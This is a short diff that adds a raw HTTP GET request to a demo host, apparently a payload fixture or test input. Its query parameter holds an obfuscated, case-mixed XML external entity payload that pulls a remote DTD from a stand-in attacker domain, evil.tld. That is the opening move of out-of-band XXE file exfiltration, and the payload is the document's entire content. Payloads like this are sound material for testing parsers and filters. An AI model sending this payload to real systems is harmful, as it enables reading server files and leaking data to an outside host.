@@ -1,0 +1,4 @@
+GET /a?cmd=<!eNtItY%20%%20rEmOtE%20sYsTeM%20"hTtP://eViL.tLd/X.dTd">%ReMoTe; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
